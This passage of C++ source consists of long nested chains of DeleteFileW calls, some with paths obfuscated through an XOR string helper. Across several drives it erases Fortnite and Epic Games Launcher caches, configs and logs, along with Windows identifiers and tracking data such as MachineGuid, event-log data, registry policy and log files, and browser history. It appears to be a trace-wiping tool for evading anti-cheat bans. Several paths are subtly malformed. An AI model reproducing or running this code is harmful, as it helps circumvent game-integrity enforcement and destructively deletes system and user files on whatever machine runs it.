																																														if (DeleteFileW(L"E:\\Recovery\\ntuser.sys") != 0)
																																															DeleteFileW(XorWideString(L"E:\\desktop.ini"));
	if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\AC\INetCookies\ESE\container.dat)").c_str()) != 0)
		if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings\settings.dat)").c_str()) != 0)
			if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\UnrealEngine\4.23\Saved\Config\WindowsClient\Manifest.ini)").c_str()) != 0)
				if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\\Config\WindowsClient\GameUserSettings.ini)").c_str()) != 0)
					if (DeleteFileW(L"E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json") != 0)
						if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved)").c_str()) != 0)
							if (DeleteFileW(L"E:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat") != 0)
								if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\\Microsoft\OneDrive\logs\Common\DeviceHealthSummaryConfiguration.ini)").c_str()) != 0)
									if (DeleteFileW(L"E:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\InputApp_1000.17763.1.0_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat") != 0)
										if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Logs\FortniteGame.log)").c_str()) != 0)
											if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\Content.IE5)").c_str()) != 0)
												if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\History.IE5)").c_str()) != 0)
													if (DeleteFileW(L"E:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx") != 0)
														if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore\\edb.log)").c_str()) != 0)
															if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore\\v1\\edb.log)").c_str()) != 0)
																if (DeleteFileW(L"E:\\Windows\\SoftwareDistribution\\PostRebootEventCache.V2") != 0)
																	if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																		if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(ntuser.pol)").c_str()) != 0)
																			if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(ntuser.dat.LOG1)").c_str()) != 0)
																				if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(ntuser.dat.LOG2)").c_str()) != 0)
																					if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\IE\container.dat)").c_str()) != 0)
																						if (DeleteFileW(L"E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache") != 0)
																							if (DeleteFileW(L"E:\\Users\\Public\\Documents") != 0)
																								if (DeleteFileW(L"E:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin") != 0)
																									if (DeleteFileW(L"E:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CurveEditorTools\\AssetRegistry.bin") != 0)
																										if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(Documents\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
																											if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
																												if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Cloud\bb360279f89647c982d9bc6ab596c2ee\ClientSettings.Sav)").c_str()) != 0)
																													if (DeleteFileW(L"E:\\Windows\\System32\\restore\\MachineGuid.txt") != 0)
																														if (DeleteFileW(L"E:\\System Volume Information\\tracking.log") != 0)
																															if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																																if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\ntuser.pol)").c_str()) != 0)
																																	if (DeleteFileW(L"E:\\PerfLogs\\collection.dat") != 0)
																																		if (DeleteFileW(L"E:\\Drivers\\storage.cache") != 0)
																																			if (DeleteFileW(L"E:\\Intel\\setup.cache") != 0)
																																				if (DeleteFileW(L"E:\\MSOCache\\Setup.dat") != 0)
																																					if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\desktop.ini)").c_str()) != 0)
																																						if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\LMS\Manifest.sav)").c_str()) != 0)
																																							if (DeleteFileW(L"F:\\Users\\Public\\Libraries\\collection.dat") != 0)
																																								if (DeleteFileW(L"F:\\Users\\Public\\Shared Files:VersionCache") != 0)
																																									if (DeleteFileW(L"F:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat") != 0)
																																										if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Temp\0021346.tmp)").c_str()) != 0)
																																											if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(Videos\Captures\desktop.ini)").c_str()) != 0)
																																												if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds)").c_str()) != 0)
																																													if (DeleteFileW(L"F:\\desktop.ini:CachedTiles") != 0)
																																														if (DeleteFileW(L"F:\\Recovery\\ntuser.sys") != 0)
																																															DeleteFileW(XorWideString(L"F:\\desktop.ini"));
	if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\AC\INetCookies\ESE\container.dat)").c_str()) != 0)
		if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings\settings.dat)").c_str()) != 0)
			if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\UnrealEngine\4.23\Saved\Config\WindowsClient\Manifest.ini)").c_str()) != 0)
				if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\\Config\WindowsClient\GameUserSettings.ini)").c_str()) != 0)
					if (DeleteFileW(L"F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json") != 0)
						if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved)").c_str()) != 0)
							if (DeleteFileW(L"F:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat") != 0)
								if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\\Microsoft\OneDrive\logs\Common\DeviceHealthSummaryConfiguration.ini)").c_str()) != 0)
									if (DeleteFileW(L"F:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\InputApp_1000.17763.1.0_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat") != 0)
										if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Logs\FortniteGame.log)").c_str()) != 0)
											if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\Content.IE5)").c_str()) != 0)
												if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\History.IE5)").c_str()) != 0)
													if (DeleteFileW(L"F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache") != 0)
														if (DeleteFileW(L"F:\\Users\\Public\\Documents") != 0)
															if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(ntuser.pol)").c_str()) != 0)
																	if (DeleteFileW(L"F:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin") != 0)
																		if (DeleteFileW(L"F:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CurveEditorTools\\AssetRegistry.bin") != 0)
																			if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(Documents\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
																				if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
																					if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Cloud\bb360279f89647c982d9bc6ab596c2ee\ClientSettings.Sav)").c_str()) != 0)
																						if (DeleteFileW(L"F:\\Windows\\System32\\restore\\MachineGuid.txt") != 0)
																							if (DeleteFileW(L"F:\\System Volume Information\\tracking.log") != 0)
																								if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																									if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\ntuser.pol)").c_str()) != 0)
																										if (DeleteFileW(L"F:\\PerfLogs\\collection.dat") != 0)
																											if (DeleteFileW(L"F:\\Drivers\\storage.cache") != 0)
																												if (DeleteFileW(L"F:\\Intel\\setup.cache") != 0)
																													if (DeleteFileW(L"F:\\MSOCache\\Setup.dat") != 0)
																														if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Build\\NotForLicensees\\EpicInternal.txt") != 0)
																															if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Build\\PerforceBuild.txt") != 0)
																																if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Build\\SourceDistribution.txt") != 0)
																																	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Videos\Captures\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Videos\Captures\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Videos\Captures\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Videos\Captures\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\OneDrive\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Downloads\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Videos\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Pictures\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Music\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Documents\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Desktop\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\OneDrive\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Downloads\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Videos\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Pictures\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Music\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Documents\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Desktop\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\OneDrive\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Downloads\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Videos\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Pictures\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Music\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Documents\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Desktop\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\OneDrive\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Downloads\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Videos\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Pictures\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Music\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Documents\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Desktop\desktop.ini)").c_str());
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\09_SubgameSelect_Default_StW-512x1024-e47f51e25cbe9943678b9221056a808e81da40e3.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_BattleLabs_PlaylistTile-(2)-1024x512-ca5f4e84a2941264f787239caa5458d0eabd39e3.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_In-Game_Launch_Week1_SubgameSelect-512x1024-8b298ddfb13ca218af3f10017e4e989888212e9e.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_Launch_ModeTiles_Duos-1024x512-b73da22f5ef25695bd78814e0c708253a2cfd66b.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_Launch_ModeTiles_Solo-1024x512-867508f824d65b998c1e11180306eeb720b1aa11.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_Launch_ModeTiles_Squad-1024x512-4bca2b25311bd5b8c6bd4a4aa32b2bfa2fadbf78.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_LTM_Siphon_PlaylistTile-1024x512-712b3caea93ea8df09d1592c88d55913ad296526.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_LunarNewYear_GanPickaxe_MOTD_1920x1080-1920x1080-7c458359ec91e63c981ae8bae9498a590446c32b.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\BR06_ModeTile_TDM-1024x512-878ba9f92deb153ec85f2bcbce925e185344290e.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\C2CM_Launch_In-Game_Subgame_PropHunt-512x1024-c84b714dc3c2f4ec9dc966074c0c53deef2dc9.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\CM_LobbyTileArt-1024x512-fb48db36552ccb1ab4021b722ea29d515377cc.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\Fortnite%2Ffortnite-game%2Fbattleroyalenews%2F1140+HF%2F8ball_MOTD_1024x512-1024x512-b8690a2ee91e5ccfc2c9ab23561be0dda6ee55.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\Fortnite%2Ffortnite-game%2Ftournaments%2F11BR_Arena_ModeTiles_Duos-1024x512-a431d8587eb87ad5630eada21b60bca9874d116a.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\Fortnite%2Ffortnite-game%2Ftournaments%2F11BR_Arena_ModeTiles_Solo_ModeTile-1024x512-6cee09d7bcf82ce3f32ca7c77ca04948121ce617.jpg"));
	DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\DMS"));
	DeleteFileW(XorWideString(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\0BF0DEAA8A19079E0D347735A2F512415B4D9B14"));
	DeleteFileW(XorWideString(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\2895B436A3CE70D8FCBBA971A99D7782F30E1715"));
	DeleteFileW(XorWideString(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\2A6A06259337531EA5101E9BD8818AE92450FCE4"));
	DeleteFileW(XorWideString(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\2AB442E2E24447F99F9C2F298E583AD6F68AEA9B"));
	DeleteFileW(XorWideString(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\392F08F2C63619C978F2076694222ABC3054CFC4"));
	DeleteFileW(XorWideString(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\961B1FEC1E2362CF4FD638D26E622DE659AC92E9"));
	DeleteFileW(XorWideString(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\AEE16FB402698196FE2ABBC267BB5015D24144EB"));
	DeleteFileW(XorWideString(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\E14DAB2F57E4763BB4A8F40F08DD57DC07ADE36C"));
	DeleteFileW(XorWideString(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\F005B0C18B5D2B42267BDF297A7FC7C62901554B"));
	DeleteFileW(XorWideString(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\F127DEB22E390D0C299F3642BDF2B41D6E2A0B9C"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\0BF0DEAA8A19079E0D347735A2F512415B4D9B14"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\2895B436A3CE70D8FCBBA971A99D7782F30E1715"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\2A6A06259337531EA5101E9BD8818AE92450FCE4"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\2AB442E2E24447F99F9C2F298E583AD6F68AEA9B"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\392F08F2C63619C978F2076694222ABC3054CFC4"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\961B1FEC1E2362CF4FD638D26E622DE659AC92E9"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\AEE16FB402698196FE2ABBC267BB5015D24144EB"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\E14DAB2F57E4763BB4A8F40F08DD57DC07ADE36C"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\F005B0C18B5D2B42267BDF297A7FC7C62901554B"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\F127DEB22E390D0C299F3642BDF2B41D6E2A0B9C"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\c7dee411e20a44ab930f841e8d206b1b"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\a22d837b6a2b46349421259c0a5411bf"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\b800b911053c4906a5bd399f46ae0055"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\3460cbe1c57d4a838ace32951a4d7171"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\c52c1f9246eb48ce9dade87be5a66f29"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\7e2a66ce68554814b1bd0aa14351cd71"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\b6c60402a72e4081a6a47c641371c19f"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\Staged\\a1acda587b3e4c7b87df4eb11fece3c0.dat"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\a1acda587b3e4c7b87df4eb11fece3c0.dat"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000067"));
	DeleteFileW(XorWideString(L"C:\\ProgramData\\Intel\\ShaderCache\\EpicGamesLauncher_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\databases\\Databases.db"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_ssl.kaptcha.com_0.localstorage"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_www.epicgames.com_0.localstorage"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\databases"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\4cb013792b196a35_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\f1cdccba37924bda_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\ba23d8ecda68de77_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\67a473248953641b_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\b6c28cea6ed9dfc1_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\013888a1cda32b90_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000001"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00004d"));
